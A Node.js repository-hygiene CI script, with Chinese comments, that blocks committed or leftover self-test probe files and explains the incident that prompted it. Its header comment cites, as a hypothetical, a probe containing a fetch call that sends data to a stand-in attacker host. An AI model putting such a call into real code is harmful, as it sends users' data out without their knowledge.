/**
 * 仓库卫生：不允许提交自测的临时探针文件。
 *
 * ── 这条门禁是被一次真实事故催生的 ────────────────────────────────
 *
 * 写 `security-claims-self-test.mjs` 时，它的 `cleanup()` 里有一句：
 *
 *   writeFileSync(PROBE, '', 'utf8');   // 想"至少别留下带 fetch 的文件"
 *   if (existsSync(PROBE)) unlinkSync(PROBE);
 *
 * 空写那一步是罪魁：删失败时留下的是**一个 0 字节的合法文件名**
 * （`src/lib/__net-probe.ts`），比"没删掉"更难察觉。
 *
 * 结果 `git commit -a` 把它提交进了仓库。我是在 commit 输出里
 * 看到 `create mode 100644 src/lib/__net-probe.ts` 才发现。
 *
 * ── 为什么值得单独一条门禁 ────────────────────────────────────────
 *
 * 1. 这类残留**不会让任何测试变红** —— 空文件不影响编译、不影响运行，
 *    所以它能一直躺在仓库里。
 * 2. 它会**慢慢腐蚀信任**：下一个人看到 `src/lib/__net-probe.ts`
 *    会以为那是产品代码的一部分。
 * 3. 更糟的情况是探针里带着 `fetch("https://evil.example/collect")`
 *    —— 那 `security-claims.mjs` 会红，但理由是错的
 *    （它以为产品在往外发数据）。
 *
 * 检查三件事：
 *   A. `src/` 与 `scripts/` 里不存在形如 `__*probe*` / `tmp-*` / `*.orig` 的文件
 *   B. 不存在 0 字节的 `.ts` / `.tsx` 文件（几乎必然是残留）
 *   C. `git status` 里没有未跟踪的探针类文件（防"还没提交但已经留着"）
 *
 * 局限：文件名模式是人定的，不可能穷举。但这三种覆盖了实际发生过的形态，
 * 而且比"靠人记得清理"可靠得多。
 */
import { readFileSync, readdirSync, statSync, existsSync } from 'node:fs';
import { join, basename } from 'node:path';
import { spawnSync } from 'node:child_process';

let checks = 0;
let failures = 0;
function item(name, ok, evidence) {
  checks += 1;
  if (ok) console.log('  ✓ ' + name);
  else {
    failures += 1;
    console.error('  ✗ ' + name + (evidence ? ' — ' + evidence : ''));
  }
}

function walk(dir, out = []) {
  if (!existsSync(dir)) return out;
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    const st = statSync(p);
    if (st.isDirectory()) {
      if (name === 'node_modules' || name === 'dist') continue;
      walk(p, out);
    } else {
      out.push({ path: p, size: st.size });
    }
  }
  return out;
}

const srcFiles = [...walk('src'), ...walk('scripts')];

console.log('');
console.log('仓库卫生检查（自测临时文件不得残留）');
console.log(`  （扫描 src/ 与 scripts/，共 ${srcFiles.length} 个文件）`);
console.log('');

/* ── A. 探针类命名 ── */
{
  /*
   * 这些命名是自测/调试常用的临时文件形态。
   * 允许 `*.test.ts`（那是正式测试），只禁"探针"性质的名字。
   */
  const PROBE_PATTERNS = [
    /^__.*probe.*\.[tj]sx?$/i, // __net-probe.ts ← 实际泄漏过的那个
    /^probe-.*\.[tj]sx?$/i,
    /^tmp-.*\.[tj]sx?$/i,
    /\.orig$/,
    /\.rej$/,
    /\.bak$/,
  ];

  const hits = srcFiles
    .filter((f) => PROBE_PATTERNS.some((re) => re.test(basename(f.path))))
    .map((f) => f.path);

  item('src/ 与 scripts/ 里没有探针/临时文件', hits.length === 0, hits.join(', '));
}

/* ── B. 0 字节的源码文件 ── */
{
  /*
   * 0 字节的 .ts/.tsx 几乎必然是残留（正常源文件不可能空）。
   * 这条正是抓出 `__net-probe.ts` 的那个形态 —— 空写留下的空壳。
   */
  const empty = srcFiles
    .filter((f) => /\.(ts|tsx)$/.test(f.path) && f.size === 0)
    .map((f) => f.path);

  item('没有 0 字节的 .ts/.tsx 文件', empty.length === 0,
    empty.length > 0 ? empty.join(', ') : '');
}

/* ── C. git 层面：没有未跟踪的探针文件 ── */
{
  const r = spawnSync('git', ['status', '--porcelain', '--untracked-files=all'], {
    encoding: 'utf8',
  });
  if (r.status === 0) {
    const lines = String(r.stdout ?? '')
      .split('\n')
      .filter((l) => l.startsWith('??'))
      .map((l) => l.slice(3).trim());
    /*
     * tmp/ 是有意的暂存区（gitignored），不算残留。
     * 但 src/ 或 scripts/ 下的未跟踪文件可能是马上要提交的，
     * 也可能是忘删的 —— 只要名字像探针就报。
     */
    const suspicious = lines.filter(
      (p) =>
        (p.startsWith('src/') || p.startsWith('scripts/')) &&
        /__.*probe|^.*probe-|tmp-|\.orig$|\.rej$/.test(basename(p)),
    );
    item('git 未跟踪文件里没有探针类残留', suspicious.length === 0, suspicious.join(', '));
  } else {
    /* 不是 git 仓库时跳过，而不是假装通过 */
    console.log('  – 跳过 git 检查（非 git 仓库或 git 不可用）');
  }
}

/* ── D. 自测脚本的 cleanup 不许「写」探针文件 ── */
{
  /*
   * 治本：把事故的**根因**也变成可检查的。
   *
   * `_net-probe` 泄漏的直接原因是 cleanup() 里对探针文件调用了
   * writeFileSync —— 清理逻辑只该删除，不该写入。
   *
   * ⚠️ 但**变异体本身当然要写探针文件**（不写怎么测门禁？）。
   * 所以只检查 `cleanup` 函数体内部，而不是整个文件。
   * 第一版就是扫了整个文件，结果把这个自测里 6 处合法的变异写入
   * 全报成违规 —— 又是一次"审计器给出反直觉数字（6 处违规），
   * 先怀疑审计器"。
   *
   * 提取方式：从 `function cleanup(` 或 `const cleanup =` 开始，
   * 到下一个顶格 `}` 或 `process.on('exit'` 为止。
   */
  const selfTests = srcFiles.filter((f) => /-self-test\.mjs$/.test(f.path));
  const bad = [];
  let scannedWithCleanup = 0;

  for (const f of selfTests) {
    const text = readFileSync(f.path, 'utf8');
    const lines = text.split('\n');

    /* 找 cleanup 函数定义 */
    const start = lines.findIndex((l) => /^\s*(function cleanup\s*\(|const cleanup\s*=)/.test(l));
    if (start === -1) continue;
    scannedWithCleanup += 1;

    /* 找它结束的位置：从 start 往后，遇到顶格 `}` 或顶层语句 */
    let end = lines.length;
    for (let i = start + 1; i < lines.length; i += 1) {
      if (/^(}|process\.on\(|\S)/.test(lines[i])) {
        end = i;
        break;
      }
    }

    for (let i = start; i < end; i += 1) {
      const line = lines[i];
      if (/^\s*(\*|\/\/)/.test(line)) continue;
      if (/writeFileSync\s*\(\s*PROBE/.test(line)) bad.push(`${f.path}:${i + 1}`);
    }
  }

  item(
    `已检查 ${scannedWithCleanup} 个含 cleanup() 的自测脚本，清理逻辑不写探针文件`,
    bad.length === 0,
    bad.join(', '),
  );
}

console.log('');
console.log(`合计：${checks} 项，${failures} 项失败`);
if (failures > 0) {
  console.error('');
  console.error('  这类残留不会让任何测试变红，所以只能靠这条专门的门禁。');
  console.error('  清理逻辑请「只删不写」—— 空写会留下一个看起来合法的空文件。');
  process.exit(1);
}
console.log('✓ 没有自测临时文件残留');
